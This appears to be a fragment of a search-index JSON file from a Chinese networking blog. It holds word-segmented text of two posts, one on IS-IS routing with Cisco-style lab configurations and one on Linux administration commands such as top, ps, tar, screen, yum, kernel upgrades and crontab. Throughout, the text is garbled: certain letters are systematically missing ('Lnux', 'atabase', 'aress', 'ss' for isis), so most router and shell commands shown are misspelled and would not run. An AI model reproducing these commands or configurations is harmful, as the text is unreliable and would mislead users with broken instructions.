由","离开","这个","区域","Leel","-","2","Router","区域","间","路由器","，","用来","在","区域","间","传递","LSP","信息","L","2","路由器","只","能","和","L","2","或者","L","12","路由器","建立","邻居","L","2","路由器","知道","整个","AS","的","区域","情况","，","可以","学习","到","每个","区域","的","路由","条目","Leel","-","1","-","2","Router","用来","将","L","1","和","L","2","路由器","相连","，","一般","是","区域","边界","路由器","（","相当于","OSPF","的","ABR","）","L","12","路由器","可以","和","L","1","和","L","2","建立","邻居","L","12","路由器","拥有","L","1","和","L","2","所","有的","能力","默认","情况","下","，","路由器","启动","ISIS","后","，","就是","L","12","路由器","L","12","路由器","会","给","L","1","路由器","下发","一个","默认","路由","L","1","邻居","关系","同一个","区域","才","可以","建立","L","1","邻居","关系","L","2","邻居","关系","不管","是不是","一个","区域","，","都","可以","建立","L","2","邻居","关系","由于","ISIS","路由器","默认","是","L","12","路由器","，","相当于","同时","开启","L","1","和","L","2","，","所以","会","建立","两个","邻居","关系","。","#","修改","ISIS","当前","路由器","的","角色","s","-","type","leel","-","1","#","或者","在","接口","上","修改","邻居","类型","ss","crcut","-","type","leel","-","1","在","ISIS","数据库","中","，","1200","s","倒计时","，","每","900","s","一次","泛洪","。","R","1","#","sh","ss","atabase","leel","-","1","IS","-","IS","Leel","-","1","Lnk","State","Database",":","LSPID","LSP","Seq","Num","LSP","Checksum","LSP","Holtme","ATTPOLR","1.00","-","00","*","0","x","00000008","0","x","1564","785","100","R","2.00","-","00","0","x","00000009","0","xC","590","1062","100","R","3.00","-","00","0","x","00000008","0","x","50","F","3","1105","100","R","3.01","-","00","0","x","00000003","0","x","734","B","740","000","R","4.00","-","00","0","x","00000006","0","x","83","FE","75","100","R","4.01","-","00","0","x","00000002","0","xBA","8","F","123","000","R","4.02","-","00","0","x","00000002","0","x","9","AAF","64","000","ATT","：","如果","这个","被","写","为","1","，","说明","必须","产生","一条","默认","路由","指向","这个","路由器","P","：","如果","L","2","或者","L","12","路由器","链","断开","，","可以","使用","带","P","置","为","的","LSP","数据","进行","打通","OL","：","oerloa","，","以前","的","路由器","性能","不佳","，","会","超载","。","但是","现在","OL","被","利用","来","作为","故障","修复","，","设备","升级","的","时候","的","故障","路标","。","我们","会","发现","R","3","收到","了","两个","LSP","，","那个","R","3.00","-","00","是","本体","，","R","3.01","-","00","是","PSN","（","伪","节点","）","发来","的","。","show","ss","atabase","etal","ISIS","汇总","路由器","汇总","只能","做","在","区域","边界","的","L","1","L","2","或者","L","2","路由器","上","，","并且","只能","汇总","自己","这个","区域","的","。","R","5","：","添加","环回","口","lo","1","~","lo","3","，","并且","添加","到","ss","进行","路由","汇总","Loopback","1","172.16.1.1","YES","manual","up","upLoopback","2","172.16.2.1","YES","manual","up","upLoopback","3","172.16.3.1","YES","manual","up","upR","5","(","confg","-","router",")","#","nt","range","lo","1","-","3","R","5","(","confg","-","f","-","range",")","#","p","router","ssR","5","(","confg","-","f","-","range",")","#","router","ssR","5","(","confg","-","router",")","#","summary","-","aress","172.16.0.0","255.255.0.0","ISIS","其他","ISIS","度量","值","本来","是","衡量","4个","数值","，","但是","目前","来说","，","一个","也不","支持","，","所以","当前","的","集成","ISIS","度量","值","可以","理解","为","跳","数","，","没","经过","一个","入口","，","路由","metrc","+","10","；","ISIS","默认","路由","注入","，","efault","-","nformaton","orgnate","，","这个","命令","只","有","在","L","1","L","2","或者","L","2","路由器","上","有效","。","ISIS","的","L","12","路由器","默认","会","给","L","1","路由器","下发","默认","路由","，","通过","数据库","ATT","位置","来","通知","的","。","可","以","在","L","2","或者","L","12","路由器","上","配置","默认","路由器","来","影响","其他","L","12","或者","L","2","路由器","。","默认","路由","需要","在","ISIS","下","宣告","。","ISIS","命令","R","1","pngR","5","在","R","5","上","创建","lo","1","-","3","：","172.16",".","x",".","124","，","并且","通告","金ss","，","leel","-","2","，","要求","R","4","学到","的","是","汇总","的","条目","在","R","5","上下","发","默认","路由","，","让","所","有的","路由器","都","可以","学习","到","，","并且","可以","png","同","R","5","没有","被","宣告","的","100.1.1.124","lo","100","的","地址","。","#","R","1","router","ss","net","49.0001.0000.0000.0001.00","nterface","Loopback","0","p","aress","1.1.1.1","255.255.255.0","p","router","ss","nterface","Ethernet","00","p","aress","192.168.123.1","255.255.255.0","no","shutown","p","router","ss","#","R","2","router","ss","net","49.0001.0000.0000.0002.00","nterface","Loopback","0","p","aress","2.2.2.2","255.255.255.0","p","router","ss","nterface","Ethernet","00","p","aress","192.168.123.2","255.255.255.0","no","shutown","p","router","ss","nterface","Ethernet","01","p","aress","192.168.24.2","255.255.255.0","no","shutown","p","router","ss","#","R","3","router","ss","net","49.0001.0000.0000.0003.00","nterface","Loopback","0","p","aress","3.3.3.3","255.255.255.0","p","router","ss","nterface","Ethernet","00","p","aress","192.168.123.3","255.255.255.0","no","shutown","p","router","ss","nterface","Ethernet","01","p","aress","192.168.34.3","255.255.255.0","no","shutown","p","router","ss","#","R","4","router","ss","net","49.00020000.0000.0004.00","nterface","Loopback","0","p","aress","4.4.4.4","255.255.255.0","p","router","ss","nterface","Ethernet","00","p","aress","192.168.34.4","255.255.255.0","no","shutown","p","router","ss","nterface","Ethernet","01","p","aress","192.168.24.4","255.255.255.0","no","shutown","p","router","ss","nterface","Ethernet","02","p","aress","192.168.45.4","255.255.255.0","no","shutown","p","router","ss","#","R","5","router","ss","net","49.0003.0000.0000.0005.00","nterface","Loopback","0","p","aress","5.5.5.5","255.255.255.0","no","shutown","p","router","ss","nterface","Ethernet","00","p","aress","192.168.45.5","255.255.255.0","no","shutown","p","router","ss","#","配置","完","这些","R","1","就","可以","Png","通","R","5","了","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","R","5","-","-","-","汇总","nt","lo","10","p","a","172.16.1.1","255.255.255.0","p","router","ssnt","lo","20","p","a","172.16.2.1","255.255.255.0","p","router","ssnt","lo","30","p","a","172.16.3.1","255.255.255.0","p","router","ssrouter","ss","summary","-","aress","172.16.0.0","255.255.0.0","#","配置","完","这些","，","R","4","上","就","可以","看到","：","L","2","172.16.0.016","[","11520","]","a","192.168.45.5",",","00",":","00",":","04",",","Ethernet","02","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","R","5","-","-","-","默认","路由","nterface","Loopback","2","p","aress","100.1.1.5","255.255.255.255","router","ssefault","-","nformaton","orgnateshow","ss","atabase","leel","-","1","#","查看","链路","状态","数据库","show","ss","neghbors","#","查看","ISIS","邻居"],"url":"http://ymlog.cn/2020/02/12/RIP%20&%20EIGRP%20&%20ISIS/","title":"RIP & EIGRP & ISIS","content":"*简介  路由协议可以分为静态路由协议和动态路由协议，动态路由协议有两类。一类是用于内部网路互联互通的IGP协议，其中代表的有RIP、EIGRP、OSPF、ISIS等，另一类是用于区域与区域之间互通的外部网关协议，目前只有BGP。\n ...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/%E8%B7%AF%E7%94%B1%E6%8A%80%E6%9C%AF/","name":"路由技术"},"date":"2020-02-12 19:44:41"},{"word":["系统","本章","简单","介绍","一些","Lnux","系统","常用","到","的","命令","，","包括","修改","系统","相关","设置","（","比如","用户名","、","时间","日期","等","）","，","监视","系统","活动","、","Lnux","系统","包","管理","以及","环境变量","等","。","top","：","监视","进程","活动","#","第","一行","top","-","18",":","50",":","07","up","98","ays",",","2",":","34",",","1","user",",","loa","aerage",":","0.07",",","0.03",",","0.05","【","系统","时间","】","【","运行","时间","】","【","登录","终端","数","】","【","系统","负载","】","【","1","m","，","5","m","，","15","m","的","平均值","，","数值","越","小","负载","越","低","】","#","Loa","Aerage","数据","是","每隔","5秒钟","检查","一次","活跃的","进程","数","，","然后","按","特定","算法","计算出","的","数值","。","如果","这个","数","除以","逻辑","CPU","的","数量","，","结果","高于","5","的","时候","就","表明","系统","在","超负荷运转","了","。","#","第二","行","Tasks",":","108","total",",","1","runnng",",","105","sleepng",",","0","stoppe",",","2","zombe","【","进程","总数","】","【","运行","中的","进程","数","】","【","睡眠","中的","进程","数","】","【","停止","的","进程","数","】","【","僵尸","进程","】","#","第","三行%","Cpu","(","s",")",":","1.0","us",",","【","用户","占用","CPU","百分比","】","1.0","sy",",","【","系统","内核","占用","CPU","百分比","】","0.0","n",",","【","改变","过","优先","级","进程","占用","CPU","百分比","】","98.0",",","【","空闲","CPU","百分比","】","0.0","wa",",","【","IO","等待","占用","CPU","的","百分比","】","0.0","h",",","【","硬","中断","（","Harware","IRQ","）","占用","CPU","的","百分比","】","0.0","s",",","【","软","中断","（","Software","Interrupts","）","占用","CPU","的","百分比","】","0.0","st","#","第四","行","KB","Mem",":","1882084","total",",","【","物理","内存","总量","（","2","G","）","】","88084","free",",","【","内存","空闲","量","】","867740","use",",","【","内存","使用","量","】","926260","buffcache","【","缓存","的","内存","量","】","【","物理","内存","总量","】","#","第","五行","KB","Swap",":","0","total",",","【","交换","区","总量","】","0","free",",","【","空闲","交换","区","总量","】","0","use",".","【","使用","的","交换","区","总量","】","对于","内存","监控","，","在","top","里","我们","要","时刻","监控","第","五行","swap","交换","分区","的","use","，","如果","这个","数值","在","不断","的","变化","，","说明","内核","在","不断","进行","内存","和","swap","的","数据","交换","，","这是","真正","的","内存","不","够用","了","。","1","、","添加","top","的","任务","监控","PID","：","进程","USER","：","进程","所有者","PR","：","进程","优先","级","NI","：","nce","值","。","负值","表示","高","优先级","，","正值","表示","低","优先级","VIRT","：","进程","使用","的","虚拟","内存","总量","，","单位","kb","。","VIRT","=","SWAP","+","RES","RES","：","常驻","内存","，","进程","使用","的","、","未","被","换出","的","物理","内存大小","，","单位","kb","。","RES","=","CODE","+","DATA","SHR","：","共享","内存大小","，","单位","kb","S","：","进程","状态","。","D","=","不可","中断","的","睡眠","状态","R","=","运行","S","=","睡眠","T","=","跟踪","停止","Z","=","僵尸","进程","%","CPU","：","上次","更新","到","现在","的","CPU","时间","占用","百分比","%","MEM","：","进程","使用","的","物理","内存","百分比","TIME","+","：","进程","使用","的","CPU","时间","总计","，","单位","1100秒","COMMAND","：","进程","名称","（","命令","名","命令行","）","默认","情况","下","仅","显示","比较","重要的","PID","、","USER","、","PR","、","NI","、","VIRT","、","RES","、","SHR","、","S","、","%","CPU","、","%","MEM","、","TIME","+","、","COMMAND","列","。","可以","通过","下面","的","快捷键","来","更改","显示","内容","。","通过","f","键","可以","选择","显示","的","内容","。","按","f","键","之后","会","显示","列","的","列表","，","按","空格键","可以","选中","或者","取消","。","在","top","基本","视图","中","，","按键","盘","数字","“","1","”","，","可","监控","每个","逻辑","CPU","的","状况","：","2","、","top","运行","中的","命令","s","–","改变","画面","更新","频率","l","–","关闭","或","开启","第","一部分","第","一行","top","信息","的","表示","t","–","关闭","或","开启","第","一部分第二","行","Tasks","和","第","三行","Cpus","信息","的","表示","m","–","关闭","或","开启","第","一部分第四","行","Mem","和","第","五行","Swap","信息","的","表示","N","–","以","PID","的","大小","的","顺序排列","表示","进程","列表","P","–","以","CPU","占用率","大小","的","顺序排列","进程","列表","M","–","以内","存","占用率","大小","的","顺序排列","进程","列表","h","–","显示","帮助","n","–","设置","在","进程","列表","所","显示","进程","的","数量","q","–","退出","top","K","：","终止","一个","进程","。","系统","将","提示","用户","输入","需要","终止","的","进程","PID","，","以及","需要","发送","给","该","进程","什么样","的","信号","。","一般的","终止","进程","可以","使用","15","信号","；","如果","不能","正常","结束","那","就","使用","信号","9","强制","结束","该","进程","。","默认值","是","信号","15","。","在","安全","模式","中","此","命令","被","屏蔽","。","：","忽略","闲置","和","僵死","进程","。","这是","一个","开关","式","命令","。","q","：","退出","程序","r","：","重","新安","排","一个","进程","的","优先级","别","。","系统","提示","用户","输入","需要","改变","的","进程","PID","以及","需要","设置","的","进程","优先级","值","。","输入","一个","正值","将","使","优先级","降低","，","反之","则","可以","使","该","进程","拥有","更高","的","优先权","。","默认值","是","10","。","S","：","切换","到","累计","模式","。","s","：","改变","两次","刷新","之间","的","延迟","时间","。","系统","将","提示","用户","输入","新的","时间","，","单位","为","s","。","如果","有","小数","，","就","换算","成","m","s","。","输入","0","值则","系统","将","不断","刷新","，","默认值","是","5","s","。","需要","注意的","是","如果","设置","太","小的","时间","，","很可能","会","引起","不断","刷新","，","从而","根本","来不及","看","清","显示","的","情况","，","而且","系统","负载","也","会","大大","增加","。","f","或者","F","：","从","当前","显示","中","添加","或者","删除","项目","。","o","或者","O","：","改变","显示","项目","的","顺序","l","：","切换","显示","平均","负载","和","启动","时间","信息","。","m",":","切换","显示","内存","信息","。","t",":","切换","显示","进程","和","CPU","状态","信息","。","c",":","切换","显示","命令","名称","和","完整","命令行","。","M",":","根据","驻留","内存大小","进行","排序","。","P",":","根据","CPU","使用","百分比","大小","进行","排序","。","T",":","根据","时间","累计","时间","进行","排序","。","W",":","将","当前","设置","写入","~",".","toprc","文件","中","。","3","、","命令行","的","top","参数","使用","格式","：","top","[","-","]","[","]","[","p","]","[","q","]","[","c","]","[","C","]","[","S","]","[","s","]","[","n","]","参数","说明","：","：","指定","每","两次","屏幕","信息","刷新","之间","的","时间","间隔","。","当然","用户","可以","使用","s","交互","命令","来","改变","之","。","top","2","p",":","通过","指定","监控","进程","ID","来","仅仅","监控","某个","进程","的","状态","。","top","p","1","S","：","指定","累计","模式","。","s","：","使","top","命令","在","安全","模式","中","运行","。","这","将","去除","交互","命令","所","带来","的","潜在","危险","。","：","使","top","不","显示","任何","闲置","或者","僵死","进程","。","c",":","显示","整个","命令行","而","不只","是","显示","命令","名","。","pof","：","查询","ppof","python","3","kll","：","终止","进程","kll","1900","ps","：","查看","进程","ps","工具","标识","进程","的","5种","状态","码",":","D","不可","中断","unnterruptble","sleep","(","usually","IO",")","R","运行","runnable","(","on","run","queue",")","S","中断","sleepng","T","停止","trace","or","stoppe","Z","僵死","a","efunct","(","”","zombe","”",")","process","参数","作用","a","显示","所有","进程","A","显示","所有","进程","N","反向","选择","f","显示","程序","间","的","关系","u","指定","用户","的","所有","进程","au","显示","较","详细的","资讯","aux","显示","所有","包含","其他","使用者","的","行程","free","：","查看","内存","信息","参数","含义","-","h","show","human","-","reaable","output","-","l","show","etale","low","an","hgh","memory","statstcs","-","t","show","total","for","RAM","+","swap","-","s","N","repeat","prnt","eery","N","secons","-","c","N","repeat","prnt","N","tmes",",","then","ext","uname","：","查看","内核","查看","系统","内核","和","版本","信息","unameLnux","nk","3.10.0","-","957.21.2",".","el","7",".","x","86","_","64","#","1","SMP","We","Jun","5","14",":","26",":","44","UTC","2019","x","86","_","64","x","86","_","64","x","86","_","64","GNU","&","#","x","2","F",";","Lnuxuname","-","r","3.10.0","-","957.21.2",".","el","7",".","x","86","_","64","查看","当前","系统","版本","的","详细信息","cat","&","#","x","2","F",";","etc","&","#","x","2","F",";","rehat","-","releaseCentOS","Lnux","release","7.6.1810","(","Core",")","tmeatectl","：","设置","时区","tmeatectl","set","-","tmezone","Asa","&","#","x","2","F",";","Shangha","hostnamectl","：","设置","主机名","hostnamectl","set","-","hostname","nk","#","更改","主机名","ate","：","查看","时间","ate","-","Rate","\"","+","%","Y","-","%","m","-","%","%","H",":","%","M",":","%","S","\"","#","+","号","容易","遗忘","who","：","查看","当前","用户","#","查看","当前","登","入","主机","的","用户","终端","信息","whoroot","pts","0","2019","-","08","-","05","09",":","05","(","49.70.158.195",")","root","pts","1","2019","-","08","-","05","09",":","17","(","49.70.158.195",")","type","：","查看","命令","格式","type","cc","s","a","shell","bultntype","python","3","python","3","s","usrlocalbnpython","3","tar","：","压缩","或","解压","参数","作用","-","c","压缩文件","compress","-","x","解压","文件","-","z","用","Gzp","压缩","或","解压","-","j","用","bzp","2","压缩","或","解压","-","显示","压缩","或","解压","的","过程","-","f","目标","文件名","-","p","保留","原始的","权限","与","属性","-","P","使用","绝对","路径","来","压缩","-","C","指定","解压","到","的","目录","#","压缩","和","解压","GZp","文件","#","将","图片","全部","压缩","tar","-","czf","test",".","tar",".","gz","*",".","jpg","#","解压","tar","-","xzf","test",".","tar",".","gz","#","压缩","和","解压","br","2","文件","#","压缩","tar","-","jc","test",".","tar",".","br","2","*",".","jpg","#","解压","tar","-","xf","test",".","tar",".","br","2","Screen","：","记录","面板","参数","作用","-","S","创建","会话","窗口","；","-","将","指定","会话","进行","离线","处理","；","-","r","恢复","指定","会话","；","-","x","一次性","恢复","所","有的","会话","；","-","ls","显示","当前","已","有的","会话","；","-","wpe","把","目前","无法","使用","的","会话","删除","直接","用","screen","跟","命令","[","root@localhost","~","]","#","screen","png","bau",".","com","[","root@localhost","~","]","#","screen","-","r","64","bytes","from","220.181.38.148","(","220.181.38.148",")",":","cmp","_","seq","=","8","ttl","=","128","tme","=","39.0","ms","64","bytes","from","220.181.38.148","(","220.181.38.148",")",":","cmp","_","seq","=","9","ttl","=","128","tme","=","40.1","ms","64","bytes","from","220.181.38.148","(","220.181.38.148",")",":","cmp","_","seq","=","10","ttl","=","128","tme","=","37.9","ms","[","root@localhost","~","]","#","建立","恢复","指定","的","会话","#","创建","[","root@localhost","~","]","#","screen","-","S","DDD","[","root@localhost","~","]","#","png","bau",".","com","PING","bau",".","com","(","39.156.69.79",")","56","(","84",")","bytes","of","ata",".","64","bytes","from","39.156.69.79","(","39.156.69.79",")",":","cmp","_","seq","=","1","ttl","=","128","tme","=","34.5","ms","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","恢复","[","root@localhost","~","]","#","screen","-","r","64","bytes","from","39.156.69.79","(","39.156.69.79",")",":","cmp","_","seq","=","30","ttl","=","128","tme","=","31.2","ms","#","查看","[","root@localhost","~","]","#","screen","-","lsThere","s","a","screen","on",":","21207",".","DDD","(","Attache",")","1","Socket","n","arrunscreenS","-","root",".","#","退出","[","root@localhost","~","]","#","ext","#","亦","或者","：","[","root@localhost","~","]","#","rm","arrunscreenS","-","root","21024",".","DZq","rm",":","remoe","socket","‘","arrunscreenS","-","root","21024",".","DZq","’","?","y","#","查看","[","root@localhost","~","]","#","screen","-","lsNo","Sockets","foun","n","arrunscreenS","-","root",".","环境变量","#","查看","系统","中的","环境变量","echo","$","PATHusrlocalsbn",":","usrlocalbn",":","usrsbn",":","usrbn",":","rootbn","#","添加","环境变量","export","PATH","=","$","PATH",":","homeusrlocalsbn",":","usrlocalbn",":","usrsbn",":","usrbn",":","rootbn",":","home","Lnux","作为","一个","多用户","多","任务","的","操作系统","，","能够","为","每个","用户","提供","独立的","、","合适的","工作","运行","环境","，","因此","，","一个","相同","的","变量","会","因为","用户","身份","的","不同","而","具有","不同的","值","。","例如","，","我们","使用","下述","命令","来","查看","HOME","变量","在","不同","用户","身份","下","都","有","哪些","值","[","root@noe","~","]","#","usera","NIKIDZQ","[","root@noe","~","]","#","su","-","NIKIDZQ","[","NIKIDZQ@noe","~","]","$","echo","\"","$","HOME","\"","homeNIKIDZQ","[","root@noe","~","]","#","echo","\"","$","HOME","\"","root","其实","变量","是","由","固定","的","变量","名","与","用户","或","系统","设置","的","变量","值","两","部分","组成","的","，","我们","完全","可以","自行","创建","变量","，","来","满足","工作","需求","。","例如","设置","一个","名称","为","WORKDIR","的","变量","，","方便","用户","更","轻松地","进入","一个","层次","较","深","的","目录","：","[","root@lnuxprobe","~","]","#","mkr","homeworkr","[","root@lnuxprobe","~","]","#","WORKDIR","=","homeworkr","[","root@lnuxprobe","~","]","#","c","$","WORKDIR","[","root@lnuxprobe","workr","]","#","pwhomeworkr","但是","，","这样","的","变量","不具","有","全局性","，","作用","范围","也","有限","，","默认","情况","下","不能","被","其他用户","使用","。","如果","工作","需要","，","可以","使用","export","命令","将","其","提升","为","全局变量","，","这样","其他用户","也","就","可以","使用","它","了","：","[","root@lnuxprobe","workr","]","#","su","lnuxprobeLast","logn",":","Fr","Mar","20","20",":","52",":","10","CST","2017","on","pts","0","[","lnuxprobe@lnuxprobe","~","]","$","c","$","WORKDIR","[","lnuxprobe@lnuxprobe","~","]","$","echo","$","WORKDIR","[","lnuxprobe@lnuxprobe","~","]","$","ext","[","root@lnuxprobe","~","]","#","export","WORKDIR","[","root@lnuxprobe","~","]","#","su","lnuxprobeLast","logn",":","Fr","Mar","20","21",":","52",":","10","CST","2017","on","pts","0","[","lnuxprobe@lnuxprobe","~","]","$","c","$","WORKDIR","[","lnuxprobe@lnuxprobe","workr","]","$","pwhomeworkr","升级","Lnux","内核","uname","-","ayum","-","y","upate","#","导入","ELRepo","仓库","的","公共","密钥","rpm","-","-","mport","https",":","www",".","elrepo",".","orgRPM","-","GPG","-","KEY","-","elrepo",".","org","#","安装","ELRepo","仓库","的","yum","源","rpm","-","Uh","http",":","www",".","elrepo",".","orgelrepo","-","release","-","7.0","-","3",".","el","7",".","elrepo",".","noarch",".","rpm","#","查看","可用","的","系统","内核","包","yum","-","-","sablerepo","=","\"","*","\"","-","-","enablerepo","=","\"","elrepo","-","kernel","\"","lst","aalable","#","安装","最新","版本","内核","yum","-","-","enablerepo","=","elrepo","-","kernel","nstall","kernel","-","ml","#","查看","系统","可用","内核","suo","awk","-","F","\\","'","'","$","1","=","=","\"","menuentry","\"","&","#","123",";","prnt","+","+","\"",":","\"","$","2","&","#","125",";","'","etcgrub","2",".","cfg","#","0",":","CentOS","Lnux","(","5.4.13","-","1",".","el","7",".","elrepo",".","x","86","_","64",")","7","(","Core",")","#","1",":","CentOS","Lnux","(","3.10.0","-","1062.9.1",".","el","7",".","x","86","_","64",")","7","(","Core",")","#","2",":","CentOS","Lnux","(","3.10.0","-","957",".","el","7",".","x","86","_","64",")","7","(","Core",")","#","3",":","CentOS","Lnux","(","0","-","rescue","-","6822","b","99242254225","a","3","baef","824","f","5","f","3165",")","7","(","Core",")","#","设置","新的","内核","为","grub","2","的","默认","版本","，","0","是","上面","查询","的","可用","内核","grub","2","-","set","-","efault","0","#","设置","GRUB","_","DEFAULT","=","0","，","通过","上面","查询","显示","的","编号","为","0","的","内核","作为","默认","内核","：","m","etcefaultgrub","#","GRUB","_","TIMEOUT","=","5","#","GRUB","_","DISTRIBUTOR","=","\"","$","(","se","'","s",",","release",".","*","$",",",",","g","'","etcsystem","-","release",")","\"","#","GRUB","_","DEFAULT","=","0","#","GRUB","_","DISABLE","_","SUBMENU","=","true","#","GRUB","_","TERMINAL","_","OUTPUT","=","\"","console","\"","#","GRUB","_","CMDLINE","_","LINUX","=","\"","crashkernel","=","auto","r",".","lm",".","l","=","centosroot","r",".","lm",".","l","=","centosswap","rhgb","quet","\"","#","GRUB","_","DISABLE","_","RECOVERY","=","\"","true","\"","#","生成","grub","配置","文件","并重","启","grub","2","-","mkconfg","-","o","bootgrub","2","grub",".","cfgreboot","#","查看","系统","中","全部","的","内核","：","rpm","-","qa","grep","kernel","#","删除","旧版","内核","yum","remoe","kernel","-","3.10.0","-","957",".","el","7",".","x","86","_","64","\\","kernel","-","tools","-","3.10.0","-","957",".","el","7",".","x","86","_","64","\\","kernel","-","3.10.0","-","1062.9.1",".","el","7",".","x","86","_","64","\\","kernel","-","tools","-","lbs","-","3.10.0","-","957",".","el","7",".","x","86","_","64","rpm","包","管理","l","列出","包","的","所有","文件","和","目录","q","查询","a","查询","所有","包","常用的","使用方法","：","rpm","-","h","package","-","-","-","yum","nstall","packagerpm","-","Uh","package","-","-","-","yum","upate","packagerpm","-","eh","package","-","-","-","yum","remoe","packagerpm","-","qarpm","-","ql","yum","包","管理","yum","配置","文件","：","etcyum",".","conf","：","为","所有","仓库","提供","的","公共","配置","文件","etcyum",".","repos",".","*",".","repo","：","为","仓库","提供","指定","的","配置","公共","配置","：","[","base","]","#","仓库","IDname","=","CentOS","-","$","releaseer","-","Base","-","mrrors",".","alyun",".","com","#","仓库","名称","faloermetho","=","prortybaseurl","=","http",":","mrrors",".","alyun",".","comcentos","$","releaseeros","$","basearch","http",":","mrrors",".","alyuncs",".","comcentos","$","releaseeros","$","basearch","http",":","mrrors",".","clou",".","alyuncs",".","comcentos","$","releaseeros","$","basearch","#","源","站点","URLgpgcheck","=","1","#","gpg","秘钥","管理","，","0","是","验证","，","1","是","不","验证","gpgkey","=","http",":","mrrors",".","alyun",".","comcentosRPM","-","GPG","-","KEY","-","CentOS","-","7","#","指定","gpg","秘钥","文件","地址","#","release","upates","显示","仓库","列表","-","-","-","-","-","yum","repslst","显示","程序","包","-","-","-","-","-","yum","lst","升级","程序包","-","-","-","-","-","yum","upate","[","package","1","]","[","package","2","]","安装","程序包","-","-","-","-","-","yum","nstall","package","降级","程序包","-","-","-","-","-","yum","owngrae","[","package","1","]","[","package","2","]","可用","升级","包","-","-","-","-","-","yum","check","-","upate","卸载","程序包","-","-","-","-","-","yum","remoe","[","package","]","fn","-","name","mysql","marab","清除","缓存","-","-","-","-","-","yum","clean","all","构建","本地","缓存","-","-","-","-","-","yum","makecache","查看","程序包","信息","-","-","-","-","yum","nfo","[","package","]","计划","任务","系统","任务","调度","的","配置文件","：","etccrontab","用户","的","计划","任务","文件","（","以","发起","计划","任务","用户","的","身份","划分","）","：","arspoolcron","[","root@localhost","~","]","#","cat","etccrontab","SHELL","=","bnbashPATH","=","sbn",":","bn",":","usrsbn",":","usrbnMAILTO","=","root","#","For","etals","see","man","4","crontabs","#","Example","of","job","efnton",":","#",".","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","mnute","(","0","-","59",")","#",".","-","-","-","-","-","-","-","-","-","-","-","-","-","hour","(","0","-","23",")","#",".","-","-","-","-","-","-","-","-","-","-","ay","of","month","(","1","-","31",")","#",".","-","-","-","-","-","-","-","month","(","1","-","12",")","OR","jan",",","feb",",","mar",",","apr",".",".",".","#",".","-","-","-","-","ay","of","week","(","0","-","6",")","(","Sunay","=","0","or","7",")","OR","sun",",","mon",",","tue",",","we",",","thu",",","fr",",","sat","#","#","*","*","*","*","*","user","-","name","comman","to","be","execute","前","四","行","是","用来","配置","cron","任务","运行","的","环境变量","第","一行","SHELL","变量","指定","了","系统","要","使用","哪个","shell","，","这里","是","bash","第二","行","PATH","变量","指定","了","系统","执行","命令","的","路径","第","三行","MAILTO","变量","指定","了","cron","的","任务","执行","信息","将","通过","电子邮件","发送","给","root","用户","如果","MAILTO","变量","的","值","为","空","，","则","表示","不","发送","任务","执行","信息","给","用户","第四","行","的","HOME","变量","指定","了","在","执行","命令","或者","脚本","时","使用","的","主目录","。","星号","（","*","）","：","代表","所有","可能","的","值","，","如","month","字段","为","星号","，","则","表示","在","满足","其它","字段","的","制约","条件","后","每月","都","执行","该","命令","操作","。","逗号","（",",","）","：","可以","用","逗号","隔开","的","值","指定","一个","列表","范围","，","例如","，","“","1",",","2",",","5",",","7",",","8",",","9","”","中","杠","（","-","）","：","可以","用","整数","之间","的","中","杠","表示","一个","整数","范围","，","例如","“","2","-","6","”","表示","“","2",",","3",",","4",",","5",",","6","”","正","斜线","（","）","：","可以","用","正","斜线","指定","时间","的","间隔","频率","，","例如","“","0","-","232","”","表示","每","两","小时","执行","一次","。","小","结","：","数字","的","表示","最好","用","2","为","阿拉伯数字","显示","周和","日","最好","不要","同时","用","定时","任务","要","加","注解","可以","定向","到","日志","文件","或者","空文","件","定时","任务","一定","是","绝对","路径","，","且","目录","必须","存在","才能","出","结果","crontab","服务","一定要","开启","运行","-","u","定义","用户","-","e","编辑","任务","-","l","显示","用户","的","计划","任务","-","r","删除","用户","计划","任务","-","交互式","-","n","host","设置","某个","机器","加","护","任务","-","c","获取","某","台","机器","的","计划","任务","Note","：","如果","在","编辑","计划","任务","的","时候","使用","到","%","，","需要","进行","转义","arlogcron","每月","每天","每小时","的","第","0","分钟","执行","一次","bnls","0","*","*","*","*","bnls","在","12","月","内",",","每天","的","早上","6","点","到","12","点","，","每隔","3","个","小时","0","分钟","执行","一次","usrbnbackup","0","6","-","123","*","12","*","usrbnbackup","周一","到","周五","每天","下午","5",":","00","寄","一封","信","给","alex","@","oman",".","name","0","17","*","*","1","-","5","mal","-","s","\"","h","\"","alex","@","oman",".","name","tmpmalata","每月","每天","的","午夜","0","点","20","分",",","2","点","20","分",",","4","点","20","分","…",".","执行","echo","“","haha","”","20","0","-","232","*","*","*","echo","\"","haha","\"","下面","再看","看","几个","具体的","例子","：","0","*","2","*","*","*","sbnserce","http","restart","意思","是","每","两个","小时","重","启","一次","apache","50","7","*","*","*","sbnserce","ssh","start","意思","是","每天","7","：","50","开启","ssh","服务","50","22","*","*","*","sbnserce","ssh","stop","意思","是","每天","22","：","50","关闭","ssh","服务","0","0","1",",","15","*","*","fsck","home","每月","1号","和","15号","检查","home","磁盘","1","*","*","*","*","homebrucebackup","每小时","的","第","一分","执行","homebrucebackup","这个","文件","00","03","*","*","1","-","5","fn","home","\"","*",".","xxx","\"","-","mtme","+","4","-","exec","rm","&","#","123",";","&","#","125",";","\\",";","每周","一","至","周五3点钟","，","在","目录","home","中","，","查找","文件","名为","*",".","xxx","的","文件","，","并","删除","4","天","前","的","文件","。","30","6","*","10","*","*","ls","意思","是","每月","的","1","、","11","、","21","、","31日","是的","6","：","30","执行","一次","ls","命令","网络","本章","介绍","Lnux","网路","相关","命令","，","主要","的","有","ssh","、","scp","其余","的","比较","杂","，","但","又","有些","会","用到","，","所以","放","在","了","一起","。","png","：","发送","ICMP","报文","[","root@noe","~","]","#","png","-","c","3","www",".","bau",".","comPING","www",".","a",".","shfen",".","com","(","183.232.231.174",")","56","(","84",")","bytes","of","ata",".","64","bytes","from","183.232.231.174","(","183.232.231.174",")",":","cmp","_","seq","=","1","ttl","=","128","tme","=","36.4","ms","64","bytes","from","183.232.231.174","(","183.232.231.174",")",":","cmp","_","seq","=","2","ttl","=","128","tme","=","35.2","ms","64","bytes","from","183.232.231.174","(","183.232.231.174",")",":","cmp","_","seq","=","3","ttl","=","128","tme","=","35.0","ms","-","-","-","www",".","a",".","shfen",".","com","png","statstcs","-","-","-","3","